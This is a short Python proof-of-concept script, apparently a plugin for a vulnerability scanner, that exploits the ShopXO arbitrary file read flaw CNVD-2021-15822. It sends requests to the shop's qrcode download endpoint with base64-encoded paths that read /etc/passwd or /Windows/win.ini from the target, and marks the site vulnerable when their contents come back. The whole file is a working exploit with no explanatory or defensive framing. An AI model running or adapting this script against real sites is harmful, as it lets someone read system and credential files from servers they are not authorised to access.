#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/69cDWCDoVXRhehqaHPgYog',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'ShopXO 任意文件读取漏洞 CNVD-2021-15822',

      'level'     :   'medium',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  targets = ['/public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q=','/public/index.php?s=/index/qrcode/download/url/L1dpbmRvd3Mvd2luLmluaQ=']
  url1 = url + targets[0]
  url2 = url + targets[1]
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'root:.*?:[0-9]*:[0-9]*:',res.text,re.S):
      # ret['huixian'] = res.text
      ret['ifbug'] = True
      res.close()
      return ret
  except:
    pass
  try:
    ret['url'] = url2
    res=requests.get(url=url2,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'for 16-bit app support',res.text,re.S):
      # ret['huixian'] = res.text
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret